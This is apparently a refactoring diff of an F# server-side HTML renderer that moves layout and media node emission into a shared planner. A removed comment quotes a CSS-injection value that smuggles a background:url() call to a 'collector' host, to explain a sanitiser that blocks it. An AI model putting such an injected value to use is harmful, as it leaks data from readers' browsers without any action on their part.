@@ -123,14 +123,23 @@ module private Emit =
     let attrs (pairs: (string * string) list) : IReactProperty list =
         pairs |> List.map (fun (k, v) -> prop.custom (k, v))
 
-    let private property (p: ElementPlan.Prop) : IReactProperty =
-        match p with
-        | ElementPlan.Prop.Attr(name, value) -> prop.custom (name, value)
-        | ElementPlan.Prop.Style declarations ->
-            prop.style (declarations |> List.map (fun (k, v) -> style.custom (k, v)))
+    /// The boolean attributes this renderer wrote through the element
+    /// library's boolean props before Phase 2278, which spell them
+    /// `name="true"`; every other flag was a custom attribute with an empty
+    /// value. Keeping both spellings keeps the served bytes.
+    let private libraryBooleans =
+        set [ "disabled"; "controls"; "loop"; "autoplay"; "muted" ]
 
-    /// Planned properties (a style site's inline declarations, typically).
-    let props (ps: ElementPlan.Prop list) : IReactProperty list = ps |> List.map property
+    /// A planned property; a behaviour attachment point writes nothing — the
+    /// served affordance is inert (Phase 2278).
+    let private property (p: ElementPlan.Prop) : IReactProperty list =
+        match p with
+        | ElementPlan.Prop.Attr(name, value) -> [ prop.custom (name, value) ]
+        | ElementPlan.Prop.Style declarations ->
+            [ prop.style (declarations |> List.map (fun (k, v) -> style.custom (k, v))) ]
+        | ElementPlan.Prop.Flag name when libraryBooleans.Contains name -> [ prop.custom (name, "true") ]
+        | ElementPlan.Prop.Flag name -> [ prop.custom (name, "") ]
+        | ElementPlan.Prop.Behaviour _ -> []
 
     /// Emit a plan.
     let rec plan (p: ElementPlan.Plan<ReactElement>) : ReactElement =
@@ -140,7 +149,7 @@ module private Emit =
         | ElementPlan.Plan.TextNode text -> Html.text text
         | ElementPlan.Plan.Element spec ->
             let props =
-                [ yield! spec.Props |> List.map property
+                [ yield! spec.Props |> List.collect property
                   match spec.Content with
                   | ElementPlan.Content.Empty -> ()
                   | ElementPlan.Content.Text text -> prop.text text
@@ -257,6 +266,16 @@ and private renderNodeCore (walk: Walk) (ctx: ServerRenderContext) (node: Node<o
               prop.children [ element ] ]
     | None -> element
 
+/// The per-kind dispatch. Phase 2108 / 2278 — a planned kind is ONE behaviour
+/// emitted twice: its arm is a call to the shared `ElementPlan` planner (the
+/// display, layout and media kinds) plus, on the client, the resolver closure
+/// that binds the plan's named attachment points. The six STRUCTURAL arms —
+/// `ErrorBoundary`, `Switch`, `Custom`, `FragmentDecl`, `FragmentRef`, `Mount` —
+/// stay here by nature (Phase 2278 ruling): they are walk control, deciding
+/// which node renders and how (error suspension, case selection, fragment
+/// expansion with cycle tracking, host renderer registries, guest loaders),
+/// and the walk is each renderer's own; the leaf markup they emit is
+/// `ElementPlan.StructuralPlan`.
 and private renderKind
     (walk: Walk)
     (ctx: ServerRenderContext)
@@ -269,445 +288,23 @@ and private renderKind
     (semanticAttrs: (string * string) list)
     : ReactElement =
     match kind with
-    // -- Layout --
-    // Phase 390 — the unified container; role + layout drive the emitted
-    // element + classes so SSR output stays byte-identical to the pre-merge
-    // per-kind emission (and to the client renderer — SSR parity corpus).
-    | NodeKind.Box spec ->
-        // Phase 1473 — the same print-break suffix the client renderer appends,
-        // from the same shared helper, so SSR and CSR emit an identical class
-        // string. This is the whole of the SSR floor: the declarations are CSS
-        // in a `@media print` block and need no script, so the static rendering
-        // honours them completely rather than degrading.
-        let brk = Theme.printBreakClasses spec.KeepTogether spec.BreakBefore
-
-        match spec.Role, spec.Layout with
-        | BoxRole.Card, _ ->
-            Html.section
-                [ prop.className (Css.Class.LayoutCard + brk)
-                  prop.children
-                      [ match spec.Heading with
-                        | Some heading ->
-                            Html.header [ prop.className Css.Class.CardHeading; prop.text (renderText ctx heading) ]
-                        | None -> Html.none
-                        Html.div
-                            [ prop.className Css.Class.CardBody
-                              prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ] ] ]
-        | BoxRole.Dashboard, _
-        | BoxRole.Group, BoxLayout.Auto ->
-            Html.div
-                [ prop.className (Css.Class.LayoutDashboard + brk)
-                  prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ]
-        | BoxRole.Separator, _ -> Html.hr [ prop.className (Css.Class.LayoutSeparator + brk) ]
-        | BoxRole.Group, BoxLayout.Grid(cols, gridTemplateColumns, gridGap) ->
-            // Phase 1523 — `templateColumns` is a free string on the wire that
-            // lands verbatim in a `style` attribute, so it is the one slot in
-            // this renderer where a decoded document writes CSS. Unsanitised,
-            // `"1fr;background:url(https://collector/?d=…)"` closed the
-            // declaration, opened a second one, and fetched on RENDER with no
-            // user act — outside the egress policy that governs every `href`
-            // and `src` in the same document — while the React client dropped
-            // the identical value silently. `sanitizeCssValueForSlot` is the
-            // shared grammar (`Fuaran.UI.EmissionGrammar`), so every host now
-            // emits the same bytes for the same tree; a refusal emits the empty
-            // value (the browser falls back to the stylesheet's own rule) and
-            // marks the element so the refusal is visible in the document.
-            let declaredTemplateColumns =
-                match gridTemplateColumns with
-                | Some custom -> custom
-                | None -> sprintf "repeat(%d, 1fr)" cols
-
-            let templateColumns, cssRefusalAttrs =
-                Sanitize.sanitizeCssValueForSlot "grid-template-columns" declaredTemplateColumns
-
-            // `gap` (Phase 459) emits only when set — gap-free grids stay
-            // byte-identical to the pre-459 emission (SSR parity with the client).
-            // The property name deliberately diverges from the client arm's
-            // camelCase `gridTemplateColumns`: Feliz.ViewEngine emits the key
-            // verbatim into the style attribute (where CSS ignores camelCase),
-            // while the client's React style object requires camelCase.
-            let gridDeclarations = Csp.Declarations.grid templateColumns gridGap
-
-            // Phase 1545 — under `Csp.Strict` these become a generated class and
-            // a collected declaration; under `Permissive` the `style` attribute
-            // above, byte for byte.
-            let gridClass, gridStyleProps =
-                ElementPlan.styleSite ctx.Policy.Csp (Some ctx.Styles) parentNodeId "grid" gridDeclarations
-
-            Html.div (
-                [ prop.className (Css.Class.LayoutGrid + brk + gridClass) ]
-                @ Emit.props gridStyleProps
-                @ [ prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ]
-                @ (cssRefusalAttrs |> List.map (fun (k, v) -> prop.custom (k, v)))
-            )
-        | BoxRole.Group, BoxLayout.Masonry(cols, masonryGap) ->
-            // Phase 1082 — column-FILL, realised through the CSS MULTI-COLUMN
-            // property family (`column-count` + the `gap` shorthand's
-            // `column-gap` half), which is what WIRE_FORMAT §3.6.7 makes
-            // normative. `grid-template-rows: masonry` is the other candidate
-            // and is deliberately not used: it is not deterministically
-            // available across engines, and a layout mode whose behaviour
-            // depends on which browser reads it is not a wire contract.
-            //
-            // The column count rides inline for the same reason `Grid`'s does —
-            // so a CSS host need not pre-declare every N — and the same
-            // narrow-viewport rules in the reference sheet collapse it.
-            let masonryDeclarations = Csp.Declarations.masonry cols masonryGap
-
-            let masonryClass, masonryStyleProps =
-                ElementPlan.styleSite ctx.Policy.Csp (Some ctx.Styles) parentNodeId "masonry" masonryDeclarations
-
-            Html.div (
-                [ prop.className (Css.Class.LayoutMasonry + brk + masonryClass) ]
-                @ Emit.props masonryStyleProps
-                @ [ prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ]
-            )
-        | BoxRole.Group, BoxLayout.Flex(direction, flexWrap, flexGap) ->
-            let dir = Css.stackDirection direction
-            let wrap = Css.stackWrap flexWrap
-
-            let flexClass, flexStyleProps =
-                ElementPlan.styleSite
-                    ctx.Policy.Csp
-                    (Some ctx.Styles)
-                    parentNodeId
-                    "flex"
-                    (Csp.Declarations.flex flexGap)
-
-            Html.div (
-                [ prop.className (Css.layoutStack dir wrap + brk + flexClass) ]
-                @ Emit.props flexStyleProps
-                @ [ prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ]
-            )
-    | NodeKind.SplitPanel spec ->
-        let weightLeft = max 0.0 (min 1.0 spec.Weight)
-        let weightRight = 1.0 - weightLeft
-        let renderedChildren = spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)
-
-        let leftChildren, rightChildren =
-            match renderedChildren with
-            | [] -> [], []
-            | [ a ] -> [ a ], []
-            | a :: rest -> [ a ], rest
-
-        // Phase 1545 — the two panes are one node, so the slot discriminator is
-        // what keeps their generated classes apart when the weights are equal.
-        let leftClass, leftStyleProps =
-            ElementPlan.styleSite
-                ctx.Policy.Csp
-                (Some ctx.Styles)
-                parentNodeId
-                "split-left"
-                (Csp.Declarations.splitPane weightLeft)
-
-        let rightClass, rightStyleProps =
-            ElementPlan.styleSite
-                ctx.Policy.Csp
-                (Some ctx.Styles)
-                parentNodeId
-                "split-right"
-                (Csp.Declarations.splitPane weightRight)
-
-        Html.div
-            [ prop.className Css.Class.LayoutSplitPanel
-              prop.children
-                  [ Html.div (
-                        [ prop.className (Css.Class.SplitPaneLeft + leftClass) ]
-                        @ Emit.props leftStyleProps
-                        @ [ prop.children leftChildren ]
-                    )
-                    Html.div (
-                        [ prop.className (Css.Class.SplitPaneRight + rightClass) ]
-                        @ Emit.props rightStyleProps
-                        @ [ prop.children rightChildren ]
-                    ) ] ]
+    // Phase 2278 — the layout kinds are `ElementPlan.LayoutPlan` values,
+    // emitted inert (the server binds no attachment point).
+    | NodeKind.Box spec -> Emit.plan (ElementPlan.LayoutPlan.box (planContext walk ctx parentNodeId) spec)
+    | NodeKind.SplitPanel spec -> Emit.plan (ElementPlan.LayoutPlan.splitPanel (planContext walk ctx parentNodeId) spec)
     | NodeKind.Tabs spec ->
-        // Static tablist + the active panel. Keyboard nav + click dispatch are
-        // client-only (hydration); the server emits the ARIA structure inert.
-        let parentNodeIdStr = parentNodeId
-
-        let tabsLabelFromChild (child: Node<obj>) : string =
-            match child.Kind with
-            | NodeKind.Box { Role = BoxRole.Card
-                             Heading = Some h } -> renderText ctx h
-            | _ -> child.Id
-
-        let perTab
-            : {| label: string
-                 icon: string option
-                 disabled: bool |} list =
-            match spec.TabHeaders with
-            | Some headers ->
-                headers
-                |> List.map (fun h ->
-                    let disabled =
-                        h.Disabled
-                        |> Option.bind (BindingResolver.tryResolve ctx.Sources)
-                        |> Option.defaultValue false
-
-                    // `TabHeader.Icon` is a bare `string option` since the swap.
-                    let icon = h.Icon
-
-                    {| label = renderText ctx h.Label
-                       icon = icon
-                       disabled = disabled |})
-            | None ->
-                spec.Children
-                |> List.map (fun child ->
-                    {| label = tabsLabelFromChild child
-                       icon = None
-                       disabled = false |})
-
-        let orientationClass = Css.tabsOrientation spec.Orientation
-
-        let isVertical = spec.Orientation = Orientation.Vertical
-
-        let resolvedFromTag: int option =
-            match spec.TabTags, spec.ActiveTag with
-            | Some tags, Some tagBinding ->
-                BindingResolver.tryResolve ctx.Sources tagBinding
-                |> Option.bind (fun tag -> tags |> List.tryFindIndex ((=) tag))
-            | _ -> None
-
-        let activeIndex =
-            resolvedFromTag
-            |> Option.orElseWith (fun () -> BindingResolver.tryResolve ctx.Sources spec.ActiveIndex)
-            |> Option.defaultValue 0
-            |> max 0
-            |> min (max 0 (spec.Children.Length - 1))
-
-        let activeChild =
-            spec.Children
-            |> List.tryItem activeIndex
-            |> Option.orElseWith (fun () -> spec.Children |> List.tryHead)
-
-        let tabId (i: int) = Ids.tab parentNodeIdStr i
-        let panelId (i: int) = Ids.panel parentNodeIdStr i
-
-        Html.div
-            [ prop.className (Css.layoutTabs orientationClass)
-              prop.children
-                  [ Html.div
-                        [ prop.className Css.Class.TabsBar
-                          prop.role "tablist"
-                          prop.custom ("aria-orientation", (if isVertical then "vertical" else "horizontal"))
-                          prop.children
-                              [ for (i, t) in List.indexed perTab ->
-                                    let isActive = i = activeIndex
-
-                                    let cls =
-                                        String.concat
-                                            " "
-                                            [ Css.Class.Tab
-                                              if isActive then
-                                                  Css.Class.TabActive
-                                              if t.disabled then
-                                                  Css.Class.TabDisabled ]
-
-                                    Html.button (
-                                        [ prop.id (tabId i)
-                                          prop.className cls
-                                          prop.role "tab"
-                                          prop.custom ("aria-selected", (if isActive then "true" else "false"))
-                                          prop.custom ("aria-controls", panelId i)
-                                          prop.tabIndex (if isActive then 0 else -1)
-                                          prop.custom ("data-tab-index", string i) ]
-                                        @ (if t.disabled then
-                                               [ prop.custom ("aria-disabled", "true"); prop.disabled true ]
-                                           else
-                                               [])
-                                        @ [ prop.children
-                                                [ match t.icon with
-                                                  | Some iconSrc ->
-                                                      Emit.plan (
-                                                          ElementPlan.DisplayPlan.iconHook Css.Class.TabIcon iconSrc
-                                                      )
-                                                  | None -> Html.none
-                                                  Html.span [ prop.className Css.Class.TabLabel; prop.text t.label ] ] ]
-                                    ) ] ]
-                    Html.div
-                        [ prop.className Css.Class.TabsPanels
-                          prop.children (
-                              match activeChild with
-                              | Some childNode ->
-                                  [ Html.div
-                                        [ prop.id (panelId activeIndex)
-                                          prop.role "tabpanel"
-                                          prop.custom ("aria-labelledby", tabId activeIndex)
-                                          prop.tabIndex 0
-                                          prop.className Css.Class.TabsPanel
-                                          prop.children [ renderNode (Walk.deeper walk) ctx childNode ] ] ]
-                              | None -> []
-                          ) ] ] ]
+        Emit.plan (
+            ElementPlan.LayoutPlan.tabs
+                (planContext walk ctx parentNodeId)
+                spec
+                (ElementPlan.TabsModel.ofSpec ctx.Sources spec)
+        )
     | NodeKind.SummaryList spec ->
-        Html.section
-            [ prop.className Css.Class.LayoutSummaryList
-              prop.children
-                  [ match spec.Heading with
-                    | Some heading ->
-                        Html.header
-                            [ prop.className Css.Class.SummaryListHeading
-                              prop.text (renderText ctx heading) ]
-                    | None -> Html.none
-                    Html.div
-                        [ prop.className Css.Class.SummaryListBody
-                          prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ] ] ]
-    | NodeKind.Disclosure spec ->
-        let resolvedOpen =
-            BindingResolver.tryResolve ctx.Sources spec.Open
-            |> Option.defaultValue spec.DefaultOpen
-
-        Html.details (
-            [ prop.className Css.Class.LayoutDisclosure ]
-            @ (if resolvedOpen then [ prop.custom ("open", "") ] else [])
-            @ [ prop.children
-                    [ Html.summary
-                          [ prop.className Css.Class.DisclosureSummary
-                            prop.text (renderText ctx spec.Heading) ]
-                      Html.div
-                          [ prop.className Css.Class.DisclosureBody
-                            prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ] ] ]
-        )
-    | NodeKind.Stepper spec ->
-        let activeIndex =
-            BindingResolver.tryResolve ctx.Sources spec.ActiveStep |> Option.defaultValue 0
-
-        Html.div
-            [ prop.className Css.Class.LayoutStepper
-              prop.children
-                  [ Html.ol
-                        [ prop.className Css.Class.StepperNumbers
-                          prop.children
-                              [ for i in 0 .. spec.Children.Length - 1 ->
-                                    let isActive = i = activeIndex
-
-                                    Html.li
-                                        [ prop.className (
-                                              if isActive then
-                                                  Css.Class.StepperStepActive
-                                              else
-                                                  Css.Class.StepperStep
-                                          )
-                                          // Server-driven step selection: the live
-                                          // shim bridges a step-header click to
-                                          // `payload.index` off this attribute
-                                          // (mirrors the tab bar's data-tab-index).
-                                          prop.custom ("data-step-index", string i)
-                                          prop.text (sprintf "%d" (i + 1)) ] ] ]
-                    Html.div
-                        [ prop.className Css.Class.StepperBody
-                          prop.children (
-                              match List.tryItem activeIndex spec.Children with
-                              | Some node -> [ renderNode (Walk.deeper walk) ctx node ]
-                              | None -> []
-                          ) ] ] ]
-    | NodeKind.Modal spec ->
-        // Phase 289 overlay render-fidelity contract (server half): the overlay
-        // is ALWAYS emitted (no portal), positioned + z-indexed by CSS; closed =
-        // the `hidden` attribute. Structure is byte-identical to the client
-        // renderer (same classes + `role="dialog"` + `aria-modal`) so React
-        // hydration finds the DOM it expects. Dismiss handlers are client-only
-        // (attached on hydration) — not a structural difference.
-        let isOpen =
-            BindingResolver.tryResolve ctx.Sources spec.Open |> Option.defaultValue false
-
-        // Phase 1119 — the SSR floor for a `Popover`, and the honest one. A
-        // no-script host cannot measure an anchor, so it cannot place a surface
-        // against one: what it emits is the popover IN FLOW, at the position the
-        // node occupies in the document, with no scrim and no `aria-modal`. An
-        // emitter that wants the static render to read correctly puts the
-        // popover node immediately after its anchor — which is the normative
-        // statement in `WIRE_FORMAT.md` §3.6.11, not a property of this file.
-        //
-        // The markup is byte-identical to the client renderer's, so hydration
-        // finds the DOM it expects; the client adds placement and the
-        // light-dismiss listeners imperatively after mount.
-        // Every emitted class name is a LITERAL at its call site, never composed
-        // from a family prefix — the class-vocabulary coverage guard reads the
-        // source for those literals, and a composed name is invisible to it.
-        let surfaceChildren (headingClass: string) (dismissClass: string) (bodyClass: string) =
-            let headingEls =
-                match spec.Heading with
-                | Some h -> [ Html.h2 [ prop.className headingClass; prop.text (renderText ctx h) ] ]
-                | None -> []
-
-            let dismissEls =
-                if spec.Dismissable then
-                    [ Html.button
-                          [ prop.className dismissClass
-                            prop.custom ("type", "button")
-                            prop.ariaLabel "Close"
-                            prop.text "×" ] ]
-                else
-                    []
-
-            headingEls
-            @ dismissEls
-            @ [ Html.div
-                    [ prop.className bodyClass
-                      prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ] ]
-
-        if spec.Modality = ModalityKind.Popover then
-            Html.div (
-                [ prop.className Css.Class.Popover ]
-                @ (if not isOpen then [ prop.custom ("hidden", "") ] else [])
-                // The anchor declaration RIDES the static render — it records
-                // that the id was read, and it is the hook the client control
-                // resolves on mount. It is explicitly not coverage: nothing in
-                // a no-script host acts on it.
-                @ (match spec.Anchor with
-                   | Some a -> [ prop.custom ("data-fuaran-popover-anchor", a) ]
-                   | None -> [])
-                @ [ prop.children
-                        [ Html.div
-                              [ prop.className Css.Class.PopoverSurface
-                                prop.role "dialog"
-                                prop.children (
-                                    surfaceChildren
-                                        Css.Class.PopoverHeading
-                                        Css.Class.PopoverDismiss
-                                        Css.Class.PopoverBody
-                                ) ] ] ]
-            )
-        else
-            Html.div (
-                [ prop.className Css.Class.ModalOverlay ]
-                @ (if not isOpen then [ prop.custom ("hidden", "") ] else [])
-                @ [ prop.children
-                        [ Html.div
-                              [ prop.className Css.Class.ModalDialog
-                                prop.role "dialog"
-                                prop.custom ("aria-modal", "true")
-                                prop.children (
-                                    surfaceChildren Css.Class.ModalHeading Css.Class.ModalDismiss Css.Class.ModalBody
-                                ) ] ] ]
-            )
-    | NodeKind.ScrollArea spec ->
-        let axisClass = Css.scrollArea spec.Orientation
-
-        // Phase 1545 — the canonical pairs, spelled as `style.maxHeight
-        // (length.px h)` emitted them (`max-height:<n>px`), so the `Permissive`
-        // bytes are unchanged and the TS twin's `max-height:${n}px` still
-        // matches.
-        let scrollDeclarations = Csp.Declarations.scrollArea spec.MaxHeight spec.MaxWidth
-
-        let scrollClass, scrollStyleProps =
-            ElementPlan.styleSite ctx.Policy.Csp (Some ctx.Styles) parentNodeId "scroll" scrollDeclarations
-
-        Html.div (
-            // `prop.custom ("tabindex", ...)` emits the lowercase attribute the
-            // client's React `prop.tabIndex` normalises to — keeps SSR↔CSR
-            // byte-identical (Feliz.ViewEngine's `prop.tabIndex` would emit the
-            // camelCase `tabIndex`, diverging from React's DOM `tabindex`).
-            [ prop.className (axisClass + scrollClass); prop.custom ("tabindex", "0") ]
-            @ Emit.props scrollStyleProps
-            @ [ prop.children (spec.Children |> List.map (renderNode (Walk.deeper walk) ctx)) ]
-        )
-    // -- Display --
-    // Phase 2108 — the leaf display kinds are `DisplayPlan` values this tier
-    // emits; the client renderer emits the same plans. A value-bearing kind
-    // first asks the shared state-slot rule whether it renders its
-    // `OnLoading` / `OnError` node instead of its body.
+        Emit.plan (ElementPlan.LayoutPlan.summaryList (planContext walk ctx parentNodeId) spec)
+    | NodeKind.Disclosure spec -> Emit.plan (ElementPlan.LayoutPlan.disclosure (planContext walk ctx parentNodeId) spec)
+    | NodeKind.Stepper spec -> Emit.plan (ElementPlan.LayoutPlan.stepper (planContext walk ctx parentNodeId) spec)
+    | NodeKind.Modal spec -> Emit.plan (ElementPlan.LayoutPlan.modal (planContext walk ctx parentNodeId) spec)
+    | NodeKind.ScrollArea spec -> Emit.plan (ElementPlan.LayoutPlan.scrollArea (planContext walk ctx parentNodeId) spec)
     | NodeKind.Heading spec -> Emit.plan (ElementPlan.DisplayPlan.heading ctx.Sources spec)
     | NodeKind.Markdown spec -> Emit.plan (ElementPlan.DisplayPlan.markdown ctx.Policy.Egress ctx.Sources spec)
     | NodeKind.Metric spec ->
@@ -764,501 +361,15 @@ and private renderKind
         | Some slot -> renderNode (Walk.deeper walk) ctx slot
         | None -> Emit.plan (ElementPlan.DisplayPlan.labelValueRow ctx.Sources resolution spec)
     | NodeKind.Fact spec -> Emit.plan (ElementPlan.DisplayPlan.fact ctx.Sources spec)
+    // Phase 2278 — the media kinds are `ElementPlan.MediaPlan` values.
     | NodeKind.Link spec ->
-        let resolvedHref =
-            BindingResolver.tryResolve ctx.Sources spec.Href |> Option.defaultValue ""
-
-        // Phase 1026 — the ambient destination policy; the client tier's `Link`
-        // arm makes the identical call with the identical class, which is what
-        // keeps the two emitted hrefs parity-locked.
-        let safeHref, egressAttrs =
-            Sanitize.sanitizeUrlForEgress ctx.Policy.Egress Sanitize.EgressClass.Hyperlink resolvedHref
-
-        // Phase 1523 — the anchor token slots, resolved through the same shared
-        // grammar the client tier calls with the same arguments, so the two
-        // emitted anchors stay parity-locked exactly as `safeHref` above does.
-        // `rel` and `target` were emitted VERBATIM here, so `rel="opener"` on a
-        // `_blank` link re-enabled `window.opener` and `target` could name an
-        // arbitrary browsing context. They resolve TOGETHER because the `rel`
-        // rule depends on the sanitised target: `noopener noreferrer` is FORCED
-        // on `_blank`, whether or not the document asked for it.
-        let safeTarget, safeRel = Sanitize.sanitizeLinkAnchor spec.Target spec.Rel
-
-        match spec.Protection with
-        | Some LinkProtection.Email when safeHref.StartsWith("mailto:", System.StringComparison.Ordinal) ->
-            // Phase 812 — protected email link. The address must not appear in
-            // plaintext in the emitted document, so every character of the
-            // sanitised href AND the label is emitted as a decimal HTML entity.
-            // The browser decodes entities in both positions, so the anchor is
-            // a working `mailto:` with no JavaScript, while the raw source
-            // carries no scrapeable address. Encoding every character (not
-            // just specials) makes the fragment injection-proof by
-            // construction, which is why `dangerouslySetInnerHTML` is safe
-            // here. CSR emits the same structure with the decoded href — the
-            // two DOMs are identical after entity decoding.
-            let entityEncode (s: string) =
-                s |> Seq.map (fun c -> "&#" + string (int c) + ";") |> String.concat ""
-
-            let anchor =
-                "<a class=\"fuaran-link fuaran-link-protected\" href=\""
-                + entityEncode safeHref
-                + "\">"
-                + entityEncode (renderText ctx spec.Label)
-                + "</a>"
-
-            // Phase 951 — the anchor here is an entity-encoded opaque string,
-            // so the projection lands on the wrap `<span>`: the only element
-            // this arm owns in BOTH tiers, and parity with the client (which
-            // does build a real `<a>`) outranks reaching one tier's anchor.
-            // Writing attribute names into the raw-HTML string would open a new
-            // injection seam in a `dangerouslySetInnerHTML` payload — declined
-            // here, recorded in `docs/DECISIONS.md` D4.
-            Html.span (
-                [ prop.className Css.Class.LinkProtectedWrap
-                  prop.dangerouslySetInnerHTML anchor ]
-                @ Emit.attrs semanticAttrs
-            )
-        | _ ->
-            Html.a (
-                [ prop.className Css.Class.Link; prop.href safeHref ]
-                @ (match safeRel with
-                   | Some rel -> [ prop.custom ("rel", rel) ]
-                   | None -> [])
-                @ (match safeTarget with
-                   | Some target -> [ prop.custom ("target", target) ]
-                   | None -> [])
-                @ (if spec.Download then
-                       [ prop.custom ("download", "") ]
-                   else
-                       [])
-                // Phase 951 — the node's a11y projection lands on the anchor.
-                @ Emit.attrs semanticAttrs
-                // Phase 1026 — the refusal marker rides the element carrying
-                // the refused href. Empty on an allow.
-                @ Emit.attrs egressAttrs
-                @ [ prop.text (renderText ctx spec.Label) ]
-            )
+        Emit.plan (ElementPlan.MediaPlan.link (planContext walk ctx parentNodeId) spec semanticAttrs)
     | NodeKind.Image spec ->
-        let resolvedSrc =
-            BindingResolver.tryResolve ctx.Sources spec.Src |> Option.defaultValue ""
-
-        // Phase 1026 — `Media`: the class the browser fetches with no user act.
-        let safeSrc, egressAttrs =
-            Sanitize.sanitizeUrlForEgress ctx.Policy.Egress Sanitize.EgressClass.Media resolvedSrc
-
-        let variantClass = Css.imageVariant spec.Variant
-
-        // Phase 1077 — the presentation tokens map to classes and nothing
-        // else: no value from the tree ever reaches a style attribute.
-        // `Natural` emits NO class on either axis, so a pre-phase tree's class
-        // attribute is byte-identical to what it was.
-        let fitClass = Css.imageFit spec.Fit
-
-        let aspectClass = Css.imageAspect spec.AspectRatio
-
-        // Phase 1077 — `Eager` emits no attribute at all (the browser default);
-        // only `Lazy` is a declaration.
-        let loadingAttrs =
-            match spec.Loading with
-            | ImageLoading.Eager -> []
-            | ImageLoading.Lazy -> [ "loading", "lazy" ]
-
-        // Phase 1080 — the responsive candidate list. Three properties, each
-        // load-bearing and each the reason a line here exists:
-        //
-        // SANITISED PER ENTRY. Every candidate's `Src` goes through the SAME
-        // `sanitizeUrlForEgress` call the primary `src` does, at the same
-        // `Media` egress class. A srcset entry is a URL the browser fetches with
-        // no user act — exactly what the floor exists for — so routing only the
-        // primary through it would make `srcSet` a bypass of the one rule this
-        // node has.
-        //
-        // A FAILING ENTRY IS DROPPED, not neutered. The primary `src` collapses
-        // to `about:blank` because an `<img>` must have one; a candidate has no
-        // such obligation, and emitting `about:blank 400w` would offer the
-        // browser a rendition guaranteed to fail. Dropping it leaves the
-        // primary `src` — which is the fallback the whole mechanism is built on.
-        //
-        // ASCENDING BY WIDTH, sorted HERE. The wire preserves authored array
-        // order (a JSON array is ordered data; the canonical encoder sorts
-        // object keys only), so canonical SSR output is the renderer's
-        // obligation, not the codec's. `List.sortBy` is stable, so two entries
-        // declaring the same width keep their authored order rather than
-        // swapping on a re-render.
-        let srcSetAttrs =
-            let candidates =
-                spec.SrcSet
-                |> List.sortBy _.Width
-                |> List.choose (fun entry ->
-                    let resolved =
-                        BindingResolver.tryResolve ctx.Sources entry.Src |> Option.defaultValue ""
-
-                    // A non-empty refusal-marker list IS the refusal — read from
-                    // the seam's own verdict rather than by string-comparing the
-                    // URL it substitutes, so a later change to that substitute
-                    // cannot silently turn a dropped candidate into a served one.
-                    let safe, refusal =
-                        Sanitize.sanitizeUrlForEgress ctx.Policy.Egress Sanitize.EgressClass.Media resolved
-
-                    if safe = "" || not (List.isEmpty refusal) then
-                        None
-                    else
-                        Some(safe + " " + string entry.Width + "w"))
-
-            match candidates with
-            | [] -> []
-            // `sizes` is BOUNDED, and `100vw` is the only value the tree can
-            // justify: nothing in the document says how wide this element will
-            // be laid out, and the language has no media-query slot for an
-            // author to say so. It is stated rather than left to the HTML
-            // default so the candidate arithmetic is visible in the emitted
-            // markup instead of implied by it.
-            | xs -> [ "srcset", String.concat ", " xs; "sizes", "100vw" ]
-
-        // Phase 951 — the a11y projection lands on the `<img>` itself.
-        let img =
-            Html.img (
-                [ prop.className (variantClass + fitClass + aspectClass)
-                  prop.src safeSrc
-                  prop.alt (renderText ctx spec.Alt) ]
-                @ Emit.attrs srcSetAttrs
-                @ Emit.attrs loadingAttrs
-                @ Emit.attrs semanticAttrs
-                @ Emit.attrs egressAttrs
-            )
-
-        // Phase 1079 — the expansion affordance. Three decisions, all of them
-        // visible in these six lines.
-        //
-        // THE BASELINE IS A REAL LINK, not a marked-up control waiting for
-        // script. `<a href="{the sanitised primary src}">` around the `<img>`
-        // means a reader with no JavaScript — a crawler, a text browser, a
-        // locked-down enterprise client, a hydration that failed — clicks the
-        // thumbnail and gets the full-size asset in the browser's own viewer.
-        // The `data-fuaran-expandable` marker is what the enhancement tier
-        // reads; it is a marker on a WORKING link, never the mechanism itself.
-        // The attribute is VALUELESS because the slot is a bool whose `false`
-        // is the absence of the attribute — unlike `data-fuaran-sortable`,
-        // which carries a value precisely because a table has three states
-        // (unstated / exempt / affirmative) under a host's broad default.
-        //
-        // A REFUSED `src` EMITS NO ANCHOR. This is the srcSet rule turned on
-        // the affordance: the `<img>`'s `src` must exist, so it collapses to
-        // the refusal URL, but an anchor has no such obligation, and a link to
-        // `about:blank` is exactly the dead control this design exists to
-        // avoid. The image still renders — with its refusal marker — and the
-        // reader is simply not offered an expansion that could not work.
-        //
-        // NOTHING CROSSES THE DISPATCH GATE. There is no `Action`, no handler,
-        // no `onClick` in the emitted markup. The expansion is presentation:
-        // the wire declares that the asset is reachable, the anchor makes it
-        // reachable, and the overlay is a rendering choice the client tier
-        // makes over that anchor.
-        let expandable =
-            if spec.Expandable && safeSrc <> "" && List.isEmpty egressAttrs then
-                Html.a
-                    [ prop.className Css.Class.ImageExpand
-                      prop.href safeSrc
-                      prop.custom ("data-fuaran-expandable", "")
-                      prop.children [ img ] ]
-            else
-                img
-
-        // Phase 1078 — the caption. `None` returns the emission UNTOUCHED,
-        // which is the acceptance criterion expressed as control flow rather
-        // than as a claim: there is no wrapper to be byte-identical to, because
-        // there is no wrapper. `Some` wraps it in the semantic pair, which is
-        // the whole point — an ad-hoc `Text` sibling carried the same pixels
-        // and no binding, so assistive technology read it as the next
-        // paragraph. Nothing moves onto the `<figure>`: the a11y projection,
-        // the egress marker and the sanitised `src` all stay on the element
-        // they describe.
-        //
-        // Phase 1079 — the NESTING, stated once here and mirrored in the other
-        // three renderers: `<figure>` wraps `<a>` wraps `<img>`. The caption is
-        // OUTSIDE the link target, which is the composition decision rather
-        // than an ordering accident. A `<figcaption>` inside the anchor would
-        // make the caption's own text a click target for the expansion, and a
-        // caption is prose a reader selects, quotes and reads — sometimes
-        // several lines of it — not a second button. It would also put
-        // interactive content inside the element whose job is to LABEL the
-        // image, which is the relationship `<figure>`/`<figcaption>` exists to
-        // express.
-        match spec.Caption with
-        | None -> expandable
-        | Some caption ->
-            Html.figure
-                [ prop.className Css.Class.ImageFigure
-                  prop.children
-                      [ expandable
-                        Html.figcaption
-                            [ prop.className Css.Class.ImageFigureCaption
-                              prop.text (renderText ctx caption) ] ] ]
